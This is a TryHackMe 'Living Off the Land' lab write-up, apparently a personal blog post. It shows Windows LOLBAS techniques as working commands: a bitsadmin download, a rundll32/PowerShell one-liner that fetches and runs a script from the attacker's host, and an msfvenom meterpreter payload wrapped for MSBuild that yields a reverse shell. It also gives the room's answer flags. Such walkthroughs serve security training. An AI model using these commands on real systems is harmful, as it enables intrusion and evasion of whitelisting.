---
title: Living Off the Land
author: CYB3RM3
name: CYB3RM3 | Living Off the Land
date: 2022-12-10 11:55:04 +0100
categories: [TryHackMe, RedTeam]
tags: [Persistance, RedTeam, LOLBAS, Bypass]
---

Learn the essential concept of "Living Off the Land" in Red Team engagements.

THM Room [https://tryhackme.com/room/livingofftheland](https://tryhackme.com/room/livingofftheland)


## TASK 1 : Introduction
### Deploy the provided machine and move on to the next task. 
No Answer

## TASK 2 : Windows Sysinternals
### Read the above! 
No Answer

## TASK 3 : LOLBAS Project
### Visit the LOLBAS project's website and check out its functionalities. Then, using the search bar, find the ATT&CK ID: T1040. What is the binary's name?
Using [LOLBAS project's website](https://lolbas-project.github.io/) search feature for the ATT&CK ID 1040 we can find the binary name associated :

![T1040](/images/thm/livingofftheland/livingofftheland_1.png)
_T1040_

Answer : Pktmon.exe

### Use the search bar to find more information about MSbuild.exe. What is the ATT&CK ID?
We can search for MSBuild.exe too :

![MSBUILD.EXE](/images/thm/livingofftheland/livingofftheland_2.png)
_MSBUILD.EXE_

Answer : T1127.001

###  Use the search bar to find more information about Scriptrunner.exe. What is the function of the binary? 

![Execute](/images/thm/livingofftheland/livingofftheland_3.png)
_Execute_

Answer : Execute

###  In the next task, we will show some of the tools based on the functionalities! Let's go!
No Answer.

## TASK 4 : File Operations
### Run bitsadmin.exe to download a file of your choice onto the attached Windows VM. Once you have executed the command successfully, an encoded flag file will be created automatically on the Desktop. What is the file name?
First let's create a test file on our attacking machine and start a python http server :

```console
root@ip-10-10-141-93:~/Desktop# echo "hello" > test.txt
root@ip-10-10-141-93:~/Desktop# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.103.75 - - [10/Dec/2022 08:09:33] "GET /test.txt HTTP/1.1" 200 -
10.10.103.75 - - [10/Dec/2022 08:09:33] "GET /test.txt HTTP/1.1" 200 -
```
{: .nolineno }

Now we can use bitsadmin.exe to download this file on our target machine :

```console
C:\Users\thm\Desktop> bitsadmin.exe /transfer /Download /priority Foreground http://10.10.141.93:8000/test.txt c:\Users\thm\Desktop\payload.txt

DISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 6 / 6 (100%)
Transfer complete.

C:\Users\thm\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm\Desktop

12/10/2022  08:23 AM    <DIR>          .
12/10/2022  08:23 AM    <DIR>          ..
12/10/2022  08:14 AM                66 encoded-test.txt
12/10/2022  08:23 AM                52 enc_thm_0YmFiOG_file.txt
12/10/2022  08:11 AM                 6 payload.txt
04/14/2022  12:40 PM               955 SysinternalsSuite.lnk
12/10/2022  08:09 AM                 6 test.txt
               5 File(s)          1,085 bytes
               2 Dir(s)  13,900,763,136 bytes free
```
{: .nolineno }

Answer : enc_thm_0YmFiOG_file.txt

### Use the certutil.exe tool to decode the encoded flag file from question #1. In order to decode the file, we use -decode option as follow:

What's our encoded flag ? 

```console
C:\Users\thm\Desktop>type enc_thm_0YmFiOG_file.txt
VEhNe2VhNGUyYjlmMzYyMzIwZDA5ODYzNWQ0YmFiOGE1NjhlfQo=
```
{: .nolineno }

Ok, we can use certutil -decode to get the orignal content of the file :

```console
C:\Users\thm\Desktop>certutil -decode
Expected at least 2 args, received 0
CertUtil: Missing argument

Usage:
  CertUtil [Options] -decode InFile OutFile
  Decode Base64-encoded file

Options:
  -f                -- Force overwrite
  -Unicode          -- Write redirected output in Unicode
  -gmt              -- Display times as GMT
  -seconds          -- Display times with seconds and milliseconds
  -v                -- Verbose operation
  -privatekey       -- Display password and private key data
  -pin PIN                  -- Smart Card PIN
  -sid WELL_KNOWN_SID_TYPE  -- Numeric SID
            22 -- Local System
            23 -- Local Service
            24 -- Network Service

CertUtil -?              -- Display a verb list (command list)
CertUtil -decode -?      -- Display help text for the "decode" verb
CertUtil -v -?           -- Display all help text for all verbs
```
{: .nolineno }

We can give 2 parameters : the file to decode and the destination file to store the output.

```console
C:\Users\thm\Desktop>certutil -decode enc_thm_0YmFiOG_file.txt output.txt
Input Length = 52
Output Length = 38
CertUtil: -decode command completed successfully.
C:\Users\thm\Desktop>type output.txt
THM{ea4e2b9f362320d098635d4bab8a568e}
```
{: .nolineno }

Answer : THM{ea4e2b9f362320d098635d4bab8a568e}

## TASK 5 : File Execution
### Read the above and practice these tools on the attached machine! 
Practicing wmic.exe, explorer.exe and rundll32.exe to open calc.exe works well.

I also tried to create an arbitrary file with the rundll32.exe method :

```console
root@ip-10-10-141-93:~/Desktop# cat script.ps1 
New-Item -Path "C:\Users\thm\Desktop\hello.txt"

C:\Users\thm\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm\Desktop

12/10/2022  08:34 AM    <DIR>          .
12/10/2022  08:34 AM    <DIR>          ..
12/10/2022  08:34 AM                 0 certutil
12/10/2022  08:14 AM                66 encoded-test.txt
12/10/2022  08:23 AM                52 enc_thm_0YmFiOG_file.txt
12/10/2022  08:32 AM                 0 out.txt
12/10/2022  08:33 AM                38 output.txt
12/10/2022  08:11 AM                 6 payload.txt
04/14/2022  12:40 PM               955 SysinternalsSuite.lnk
12/10/2022  08:09 AM                 6 test.txt
12/10/2022  08:34 AM                 0 typ
12/10/2022  08:34 AM                 0 type
              10 File(s)          1,123 bytes
               2 Dir(s)  13,964,197,888 bytes free

C:\Users\thm\Desktop>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.141.93:8000/script.ps1');");

C:\Users\thm\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm\Desktop

12/10/2022  09:28 AM    <DIR>          .
12/10/2022  09:28 AM    <DIR>          ..
12/10/2022  08:34 AM                 0 certutil
12/10/2022  08:14 AM                66 encoded-test.txt
12/10/2022  08:23 AM                52 enc_thm_0YmFiOG_file.txt
12/10/2022  09:28 AM                 0 hello.txt
12/10/2022  08:32 AM                 0 out.txt
12/10/2022  08:33 AM                38 output.txt
12/10/2022  08:11 AM                 6 payload.txt
04/14/2022  12:40 PM               955 SysinternalsSuite.lnk
12/10/2022  08:09 AM                 6 test.txt
12/10/2022  08:34 AM                 0 typ
12/10/2022  08:34 AM                 0 type
              11 File(s)          1,123 bytes
               2 Dir(s)  13,964,197,888 bytes free
```
{: .nolineno }

No Answer.

## TASK 6 : Application Whitelisting Bypasses
### For more information about bypassing Windows security controls, we suggest checking the THM room: Bypassing UAC and Applocker once released!
Using signed bash.exe when linux subsystem feature is enable on windows 10 :

![Calc.exe](/images/thm/livingofftheland/livingofftheland_4.png)
_Calc.exe_

No Answer.

## TASK 7 : Other Techniques
### eplicate the steps of the No PowerShell technique to receive a reverse shell on port 4444. Once a connection is established, a flag will be created automatically on the desktop. What is the content of the flag file? 
First of all, we need to clone the git repository of [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) :

```console
root@ip-10-10-141-93:~/Desktop# git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
Cloning into 'PowerLessShell'...
remote: Enumerating objects: 368, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (42/42), done.
remote: Total 368 (delta 25), reused 5 (delta 2), pack-reused 323
Receiving objects: 100% (368/368), 111.97 KiB | 1.15 MiB/s, done.
Resolving deltas: 100% (207/207), done.
root@ip-10-10-141-93:~/Desktop# ls
'Additional Tools'   live0fftheland.dll   mozo-made-15.desktop   PowerLessShell   script.ps1   test.txt   Tools
root@ip-10-10-141-93:~/Desktop# cd PowerLessShell/
root@ip-10-10-141-93:~/Desktop/PowerLessShell# ls
include  LICENSE.md  PowerLessShell.py  README.md  wmi_msbuild.cna
root@ip-10-10-141-93:~/Desktop/PowerLessShell
```
{: .nolineno }

Then, we can create our payload with msfvenom and start a metasploit handler :

```console
root@ip-10-10-141-93:~/Desktop# msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.10.141.93 LPORT=4444 -f psh-reflection > liv0ff.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 856 bytes
Final size of psh-reflection file: 3293 bytes

STARTING METASPLOIT HANDLER :

root@ip-10-10-141-93:~/Desktop# msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.10.141.93;set lport 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => 10.10.141.93
lport => 4444
[*] Started HTTPS reverse handler on https://10.10.141.93:4444
```
{: .nolineno }

The next step is to convert the payload to be compatible with MSBUILD tool :

```console
root@ip-10-10-141-93:~/Desktop/PowerLessShell# ls
include  LICENSE.md  PowerLessShell.py  README.md  wmi_msbuild.cna
root@ip-10-10-141-93:~/Desktop/PowerLessShell# python2 PowerLessShell.py -type powershell -source ..//liv0ff.ps1 -output liv0ff.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-powershell.csproj as the template
File 'liv0ff.csproj' created
Process completed
root@ip-10-10-141-93:~/Desktop/PowerLessShell# ls
include  LICENSE.md  liv0ff.csproj  PowerLessShell.py  README.md  wmi_msbuild.cna
```
{: .nolineno }

We can copy the file generated with one previous seen method on our target windows machine :

```console
bitsadmin.exe /transfer /Download /priority Foreground http://10.10.141.93:8000/liv0ff.csproj c:\Users\thm\Desktop\liv0ff.csproj
```
{: .nolineno }

Afterwards, we can try to build the payload with MSBUILD :

```console
C:\Users\thm\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm\Desktop

12/10/2022  10:41 AM    <DIR>          .
12/10/2022  10:41 AM    <DIR>          ..
12/10/2022  10:10 AM             1,621 calc.lnk
12/10/2022  08:34 AM                 0 certutil
12/10/2022  08:14 AM                66 encoded-test.txt
12/10/2022  10:41 AM                52 enc_thm_0YmFiOG_file.txt
12/10/2022  09:28 AM                 0 hello.txt
12/10/2022  10:39 AM            11,257 liv0ff.csproj
12/10/2022  08:32 AM                 0 out.txt
12/10/2022  10:09 AM               182 output.txt
12/10/2022  08:11 AM                 6 payload.txt
04/14/2022  12:40 PM               955 SysinternalsSuite.lnk
12/10/2022  08:09 AM                 6 test.txt
12/10/2022  08:34 AM                 0 typ
12/10/2022  08:34 AM                 0 type
              13 File(s)         14,145 bytes
               2 Dir(s)  13,957,087,232 bytes free

C:\Users\thm\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
Microsoft (R) Build Engine version 4.8.3761.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 12/10/2022 10:42:32 AM.
```
{: .nolineno }

We should receive a reverse shell in our metasploit handler :

```console
root@ip-10-10-141-93:~/Desktop# msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.10.141.93;set lport 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => 10.10.141.93
lport => 4444
[*] Started HTTPS reverse handler on https://10.10.141.93:4444
[*] https://10.10.141.93:4444 handling request from 10.10.103.75; (UUID: szvocozr) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 1 opened (10.10.141.93:4444 -> 10.10.103.75:50134) at 2022-12-10 10:43:02 +0000

meterpreter > 
```
{: .nolineno }

Finally, we can search for our generated flag :

```console
meterpreter > shell
Process 5260 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm\Desktop

12/10/2022  10:42 AM    <DIR>          .
12/10/2022  10:42 AM    <DIR>          ..
12/10/2022  10:10 AM             1,621 calc.lnk
12/10/2022  08:34 AM                 0 certutil
12/10/2022  08:14 AM                66 encoded-test.txt
12/10/2022  10:41 AM                52 enc_thm_0YmFiOG_file.txt
12/10/2022  10:43 AM                37 flag.txt
12/10/2022  09:28 AM                 0 hello.txt
12/10/2022  10:39 AM            11,257 liv0ff.csproj
12/10/2022  08:32 AM                 0 out.txt
12/10/2022  10:09 AM               182 output.txt
12/10/2022  08:11 AM                 6 payload.txt
04/14/2022  12:40 PM               955 SysinternalsSuite.lnk
12/10/2022  08:09 AM                 6 test.txt
12/10/2022  08:34 AM                 0 typ
12/10/2022  08:34 AM                 0 type
              14 File(s)         14,182 bytes
               2 Dir(s)  13,955,379,200 bytes free

C:\Users\thm\Desktop>type flag.txt
type flag.txt
THM{23005dc4369a0eef728aa39ff8cc3be2}
```
{: .nolineno }

Answer : THM{23005dc4369a0eef728aa39ff8cc3be2}

## TASK 8 : Real-life Scenario
### Read the above! 
No Answer.

## TASK 9 : Conclusion 
### Good work and keep learning! 
No Answer.